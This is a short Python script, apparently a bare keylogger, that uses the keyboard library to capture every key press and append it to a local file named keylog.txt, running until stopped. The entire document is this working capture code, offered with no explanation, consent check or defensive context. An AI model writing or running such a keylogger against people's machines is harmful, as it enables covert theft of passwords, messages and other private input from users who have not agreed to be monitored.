import keyboard  # Install with: pip install keyboard

def log_key(event):
    with open("keylog.txt", "a") as f:
        f.write(f"{event.name}\n")

keyboard.on_press(log_key)
keyboard.wait()